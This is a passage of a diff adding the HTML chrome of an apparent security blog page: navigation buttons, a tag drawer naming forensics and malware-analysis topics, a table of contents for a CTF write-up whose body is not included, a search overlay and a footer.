+            d="M629.333333 853.333333h-234.666666c-17.066667 0-32 14.933333-32 32s14.933333 32 32 32h234.666666c17.066667 0 32-14.933333 32-32s-14.933333-32-32-32zM842.666667 360.533333L535.466667 113.066667c-12.8-8.533333-27.733333-8.533333-40.533334 0L183.466667 360.533333c-6.4 6.4-12.8 14.933333-12.8 23.466667 0 2.133333 0 6.4 2.133333 8.533333 2.133333 12.8 14.933333 21.333333 27.733333 21.333334h155.733334v236.8c0 19.2 12.8 29.866667 32 29.866666h249.6c21.333333 0 34.133333-12.8 34.133333-29.866666v-234.666667h151.466667c12.8 0 25.6-8.533333 27.733333-21.333333s0-25.6-8.533333-34.133334zM629.333333 746.666667h-234.666666c-17.066667 0-32 14.933333-32 32s14.933333 32 32 32h234.666666c17.066667 0 32-14.933333 32-32s-14.933333-32-32-32z"></path>
+        </svg>
+        <span class="sr-only">Top</span>
+      </button>
+      <div
+        id="tooltip-top"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Top
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+    
+
+    
+      
+      <button
+        type="button"
+        data-tooltip-target="tooltip-toc"
+        data-tooltip-placement="left"
+        data-drawer-target="drawer-body-scrolling-toc"
+        data-drawer-show="drawer-body-scrolling-toc"
+        data-drawer-body-scrolling="true"
+        aria-controls="drawer-body-scrolling-toc"
+        class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          xmlns="http://www.w3.org/2000/svg"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1">
+          <path
+            d="M901.8 313.5H354.4c-32 0-58.2-26.2-58.2-58.2v-18.1c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 246.2m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+          <path
+            d="M901.8 579.3H354.4c-32 0-58.2-26.2-58.2-58.2V503c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 512m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+          <path
+            d="M901.8 845.1H354.4c-32 0-58.2-26.2-58.2-58.2v-18.1c0-32 26.2-58.2 58.2-58.2h547.4c32 0 58.2 26.2 58.2 58.2v18.1c0 32-26.2 58.2-58.2 58.2z"></path>
+          <path
+            d="M131.3 777.8m-67.3 0a67.3 67.3 0 1 0 134.6 0 67.3 67.3 0 1 0-134.6 0Z"></path>
+        </svg>
+
+        <span class="sr-only">Catelog</span>
+      </button>
+      <div
+        id="tooltip-toc"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Catelog
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+
+      
+      
+    
+
+
+    
+    <button
+      type="button"
+      data-drawer-target="drawer-body-scrolling"
+      data-drawer-show="drawer-body-scrolling"
+      data-drawer-body-scrolling="true"
+      aria-controls="drawer-body-scrolling"
+      data-tooltip-target="tooltip-tags"
+      data-tooltip-placement="left"
+      class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+      <svg
+        class="h-5 w-5"
+        aria-hidden="true"
+        fill="currentColor"
+        viewBox="0 0 1024 1024"
+        version="1.1"
+        xmlns="http://www.w3.org/2000/svg">
+        <path
+          d="M96.512 454.272h839.84a78.752 78.752 0 0 1 78.752 78.752v8.704a78.752 78.752 0 0 1-78.752 78.752H96.512a78.752 78.752 0 0 1-78.752-78.752v-8.704a78.752 78.752 0 0 1 78.752-78.752zM571.872 232.672H904.32a55.424 55.424 0 0 1 0 110.848H571.872a55.424 55.424 0 0 1 0-110.848zM350.208 731.36h332.448a55.424 55.424 0 0 1 0 110.848H350.208a55.424 55.424 0 0 1 0-110.848zM128.544 177.248h221.664a55.424 55.424 0 0 1 0 110.848H128.544a55.424 55.424 0 0 1 0-110.848z"
+          p-id="22696"></path>
+      </svg>
+      <span class="sr-only">Tags</span>
+    </button>
+    <div
+      id="tooltip-tags"
+      role="tooltip"
+      class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+      Tags
+      <div class="tooltip-arrow" data-popper-arrow></div>
+    </div>
+
+    
+    
+      <button
+        id="to-bottom-button"
+        type="button"
+        data-tooltip-target="tooltip-bottom"
+        data-tooltip-placement="left"
+        class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M635.733333 341.333333c19.2 0 32 12.8 32 29.866667v236.8h155.733334c12.8 0 25.6 8.533333 27.733333 21.333333 2.133333 4.266667 2.133333 6.4 2.133333 10.666667 0 8.533333-6.4 19.2-12.8 25.6L529.066667 910.933333c-12.8 8.533333-27.733333 8.533333-40.533334 0L181.333333 663.466667c-8.533333-8.533333-12.8-21.333333-8.533333-34.133334 2.133333-12.8 14.933333-21.333333 27.733333-21.333333h151.466667V371.2c0-19.2 12.8-29.866667 34.133333-29.866667h249.6z m-6.4-128c17.066667 0 32 14.933333 32 32s-14.933333 32-32 32h-234.666666c-17.066667 0-32-14.933333-32-32s14.933333-32 32-32h234.666666z m0-106.666666c17.066667 0 32 14.933333 32 32S646.4 170.666667 629.333333 170.666667h-234.666666c-17.066667 0-32-14.933333-32-32S377.6 106.666667 394.666667 106.666667h234.666666z"></path>
+        </svg>
+        <span class="sr-only">Bottom</span>
+      </button>
+      <div
+        id="tooltip-bottom"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Bottom
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+    
+  </div>
+
+  <button
+    type="button"
+    data-dial-toggle="speed-dial-menu-bottom-right"
+    aria-controls="speed-dial-menu-bottom-right"
+    aria-expanded="false"
+    class="flex h-14 w-14 items-center justify-center rounded-full bg-primary text-white hover:bg-primary700 focus:outline-none focus:ring-4 focus:ring-primary dark:bg-primary dark:hover:bg-primary700 dark:focus:ring-primary700">
+    <svg
+      class="h-5 w-5 transition-transform group-hover:rotate-45"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 18 18">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="M9 1v16M1 9h16" />
+    </svg>
+    <span class="sr-only">Open actions menu</span>
+  </button>
+</div>
+<div
+  id="drawer-body-scrolling"
+  class="fixed left-0 top-0 z-40 h-screen w-64 -translate-x-full overflow-y-auto bg-white p-4 transition-transform md:w-80 lg:w-96 dark:bg-gray-800"
+  tabindex="-1"
+  aria-labelledby="drawer-body-scrolling-label">
+  <h5
+    id="drawer-body-scrolling-label"
+    class="text-base font-semibold uppercase text-gray-500 dark:text-gray-400">
+    TAGS
+  </h5>
+  <button
+    type="button"
+    data-drawer-hide="drawer-body-scrolling"
+    aria-controls="drawer-body-scrolling"
+    class="absolute end-2.5 top-2.5 inline-flex h-8 w-8 items-center justify-center rounded-lg bg-transparent text-sm text-gray-400 hover:bg-gray-200 hover:text-gray-900 dark:hover:bg-gray-600 dark:hover:text-white">
+    <svg
+      class="h-3 w-3"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 14 14">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
+    </svg>
+    <span class="sr-only">Close tags</span>
+  </button>
+
+  <div class="overflow-y-auto py-3">
+    <div class="flex flex-wrap justify-center gap-2 p-3">
+      
+        <a
+          href="http://localhost:1313/tags/bi0sctf/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Bi0sCTF</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/bi0sctf2024/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Bi0sctf2024</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/blockchain-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Blockchain Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/browser-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Browser Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/dfir/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">DFIR</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/file-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">File Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/incident-response/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Incident Response</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >4</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/mac-artefact-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">MAC Artefact Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-analyis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Analyis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >4</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-development/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Development</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/memory-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Memory Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/password-retrieval/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Password Retrieval</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/process-memory-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Process Memory Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-investigation/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Investigation</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-investigtion/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Investigtion</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-recovery/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Recovery</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/reverse-engineering/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Reverse Engineering</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/rootkit-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Rootkit Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/threat-hunting/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Threat Hunting</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/windbg-dump-debugging/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">WinDBG Dump Debugging</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/windows-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Windows Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<div
+  id="drawer-body-scrolling-toc"
+  class="fixed left-0 top-0 z-40 h-screen w-64 -translate-x-full overflow-y-auto bg-white p-4 transition-transform dark:bg-gray-800 md:w-80 lg:w-96"
+  tabindex="-1"
+  aria-labelledby="drawer-body-scrolling-toc-label">
+  <h5
+    id="drawer-body-scrolling-toc-label"
+    class="text-base font-semibold text-gray-500 dark:text-gray-400">
+    On this page
+  </h5>
+  <button
+    type="button"
+    data-drawer-hide="drawer-body-scrolling-toc"
+    aria-controls="drawer-body-scrolling-toc"
+    class="absolute end-2.5 top-2.5 inline-flex h-8 w-8 items-center justify-center rounded-lg bg-transparent text-sm text-gray-400 hover:bg-gray-200 hover:text-gray-900 dark:hover:bg-gray-600 dark:hover:text-white">
+    <svg
+      class="h-3 w-3"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 14 14">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
+    </svg>
+    <span class="sr-only">Close menu</span>
+  </button>
+  <div class="overflow-y-auto py-4">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description:</a></li>
+    <li><a href="#handout">Handout</a></li>
+    <li><a href="#solution">Solution:</a>
+      <ul>
+        <li><a href="#question-1">Question 1</a></li>
+        <li><a href="#question-2">Question 2</a></li>
+        <li><a href="#question-3">Question 3</a></li>
+        <li><a href="#question-4">Question 4</a></li>
+        <li><a href="#question-5">Question 5</a></li>
+        <li><a href="#question-6">Question 6</a></li>
+        <li><a href="#question-7">Question 7</a></li>
+        <li><a href="#question-8">Question 8</a></li>
+        <li><a href="#question-9">Question 9</a></li>
+        <li><a href="#question-10">Question 10</a></li>
+      </ul>
+    </li>
+    <li><a href="#flag">Flag:</a></li>
+    <li><a href="#closing-note">Closing Note</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+
+
+<script type="module" src="/js/to-top-or-bottom.js"></script>
+
+
+
+
+
+    
+<div
+  id="search-overlay"
+  class="fixed inset-0 z-50 hidden bg-gray-900/90 backdrop-blur-lg dark:bg-gray-900/80"></div>
+<section id="search-section" class="z-50 flex hidden h-dvh w-full flex-col">
+  
+  <div
+    class="flex h-dvh w-full flex-col overflow-auto md:mx-auto md:w-2/3 lg:max-w-2xl">
+    
+    <div
+      id="searchBoxDiv"
+      class="sticky top-[-88px] z-50 flex flex-row justify-between px-8 pt-[88px]">
+      <div id="searchBox" class="my-6 flex w-full flex-row items-center"></div>
+    </div>
+
+    
+    <div class="h-[30rem] overflow-auto">
+      <div id="searchResults" class="my-3 px-6"></div>
+      <div
+        id="NotSearchResults"
+        class="hidden flex-col items-center justify-around space-y-4 px-6 py-10">
+        <p class="font-Oswald text-lg font-bold tracking-wide text-gray-500">
+          No search content
+        </p>
+      </div>
+      <div
+        id="searchError"
+        class="hidden flex-col items-center justify-around space-y-4 px-6 py-10 text-center ">
+        <p class="font-Oswald text-lg font-bold text-red-500">
+          Oop ! Error occur ...
+        </p>
+      </div>
+      <div
+        id="searchLoading"
+        class="hidden flex-col items-center justify-around px-6 py-10">
+        <svg
+          t="1689331200868"
+          class="icon animate-spin"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg"
+          p-id="51409"
+          width="128"
+          height="128">
+          <path
+            d="M512 170.666667v85.333333a256 256 0 1 1-223.573333 131.2L213.930667 345.6A341.333333 341.333333 0 1 0 512 170.666667z"
+            fill="#bfbfbf"
+            opacity=".3"
+            p-id="51410"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+  
+  <div
+    class="bottom-0 flex flex-col items-center justify-center space-y-2 py-8 font-Oswald text-xs font-bold text-gray-600">
+    <div class="hidden md:block">Press ESC to cancle</div>
+    <div class="flex items-center">
+      <span class="">Powered by &nbsp;</span>
+      <img src="/images/default/algolia-logo.svg" alt="" class="h-4" />
+    </div>
+  </div>
+</section>
+
+<script
+  src="https://cdn.jsdelivr.net/npm/algoliasearch@4.17.2/dist/algoliasearch-lite.umd.js"
+  integrity="sha256-X2G+vjV8i6Jj2NSGFTvy6Z4q2AlmF5aH0HiIpWJ8eU4="
+  crossorigin="anonymous"></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/instantsearch.js@4.56.3/dist/instantsearch.production.min.js"
+  integrity="sha256-mWvjWAfZylKMOg+S3HLq+wng1HHRnl2Idr2r8NsUzIU="
+  crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+<script src="/js/search.js"></script>
+<footer
+  class="mx-auto flex w-full max-w-screen-xl flex-col-reverse items-center gap-y-3 border-t border-gray-200 py-6 md:px-12 lg:flex-row lg:justify-between dark:border-gray-700">
+  
+  <div
+    class="flex flex-col items-center justify-between space-y-3 text-xs text-gray-400 lg:items-start dark:text-gray-500">
+    
+    <div class="items-center font-Montserrat font-light">
+      &copy;
+      
+      
+      
+        2024
+      
+
+      azr43lkn1ght. All Rights Reserved
+    </div>
+  </div>
+
+  
+  <div
+    class="mt-4 flex space-x-5 sm:justify-center md:mt-0 rtl:space-x-reverse">
+    
+      
+        <a
+          href="mailto:nithinchenthur@gmail.com"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            fill="currentColor"
+            viewBox="0 0 1024 1024"
+            version="1.1"
+            xmlns="http://www.w3.org/2000/svg">
+            <path
+              d="M513 583.8l448.5-448.5c-11.6-4.7-24.3-7.3-37.5-7.3H100c-12.7 0-24.9 2.4-36.1 6.7L513 583.8z"
+              p-id="88208"></path>
+            <path
+              d="M513 674.3L14.6 175.9C5.3 191.1 0 208.9 0 228v568c0 55.2 44.8 100 100 100h824c55.2 0 100-44.8 100-100V228c0-18.5-5.1-35.9-13.9-50.8L513 674.3z"
+              p-id="88209"></path>
+          </svg>
+          <span class="sr-only">Email page</span>
+        </a>
+      
+      
+
+      
+
+      
+
+      
+    
+      
+      
+
+      
+
+      
+        <a
+          href="https://github.com/Azr43lKn1ght"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="currentColor"
+            viewBox="0 0 20 20">
+            <path
+              fill-rule="evenodd"
+              d="M10 .333A9.911 9.911 0 0 0 6.866 19.65c.5.092.678-.215.678-.477 0-.237-.01-1.017-.014-1.845-2.757.6-3.338-1.169-3.338-1.169a2.627 2.627 0 0 0-1.1-1.451c-.9-.615.07-.6.07-.6a2.084 2.084 0 0 1 1.518 1.021 2.11 2.11 0 0 0 2.884.823c.044-.503.268-.973.63-1.325-2.2-.25-4.516-1.1-4.516-4.9A3.832 3.832 0 0 1 4.7 7.068a3.56 3.56 0 0 1 .095-2.623s.832-.266 2.726 1.016a9.409 9.409 0 0 1 4.962 0c1.89-1.282 2.717-1.016 2.717-1.016.366.83.402 1.768.1 2.623a3.827 3.827 0 0 1 1.02 2.659c0 3.807-2.319 4.644-4.525 4.889a2.366 2.366 0 0 1 .673 1.834c0 1.326-.012 2.394-.012 2.72 0 .263.18.572.681.475A9.911 9.911 0 0 0 10 .333Z"
+              clip-rule="evenodd" />
+          </svg>
+          <span class="sr-only">GitHub account</span>
+        </a>
+      
+
+      
+    
+      
+      
+
+      
+        <a
+          href="https://twitter.com/Azr43lKn1ght"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 20 20">
+            <path
+              fill="currentColor"
+              d="M12.186 8.672 18.743.947h-2.927l-5.005 5.9-4.44-5.9H0l7.434 9.876-6.986 8.23h2.927l5.434-6.4 4.82 6.4H20L12.186 8.672Zm-2.267 2.671L8.544 9.515 3.2 2.42h2.2l4.312 5.719 1.375 1.828 5.731 7.613h-2.2l-4.699-6.237Z" />
+          </svg>
+
+          <span class="sr-only">X page</span>
+        </a>
+      
+
+      
+
+      
+    
+
+    
+    
+
+  </div>
+</footer>
+
+<script>
+  var matches = document.querySelectorAll("button[data-popover-target]");
+  for (var i = 0; i < matches.length; i++) {
+    let id = matches[i].getAttribute("data-popover-target");
+
+    matches[i].addEventListener("mouseenter", function () {
+      document.getElementById(id).classList.remove("hidden");
+    });
+
+    matches[i].addEventListener("mouseleave", function () {
+      document.getElementById(id).classList.add("hidden");
+    });
+  }
+</script>
+
+
+<script src="/js/dark-mode.js" defer></script>
+
+  
+    
+    
+    <script src="/js/toc.js"></script>
+  
+
+  
+
+  
+  
